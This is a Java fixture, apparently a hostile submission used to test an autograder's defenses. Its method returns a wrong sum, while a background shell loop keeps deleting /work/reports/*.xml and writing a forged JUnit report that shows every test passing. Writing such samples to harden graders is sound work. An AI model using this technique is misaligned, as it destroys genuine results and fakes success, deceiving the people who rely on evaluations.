package tp;

/**
 * HOSTIL — igual que hostil-reporte, pero SIN carrera que perder.
 *
 * El proceso en segundo plano reescribe el reporte en BUCLE. No depende de
 * adivinar cuándo termina la JVM: en cualquier instante en que el script mire
 * el directorio, el último que escribió fue el alumno.
 *
 * Sirve para distinguir "la defensa funcionó" de "el ataque llegó tarde".
 */
public class Solucion {
    public int suma(int a, int b) {
        try {
            String xml =
                  "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
                + "<testsuite name=\"tp.SolucionTest\" tests=\"3\" failures=\"0\""
                + " errors=\"0\" skipped=\"0\">"
                + "<testcase name=\"sumaDosPositivos\" classname=\"tp.SolucionTest\"/>"
                + "<testcase name=\"sumaConNegativos\" classname=\"tp.SolucionTest\"/>"
                + "<testcase name=\"casoBorde\" classname=\"tp.SolucionTest\"/>"
                + "</testsuite>";

            new ProcessBuilder("sh", "-c",
                    "while true; do rm -f /work/reports/*.xml; "
                  + "printf '%s' '" + xml + "' > /work/reports/TEST-forjado.xml; "
                  + "sleep 0.05; done")
                .start();
        } catch (Exception e) {
        }
        return -999;
    }
}
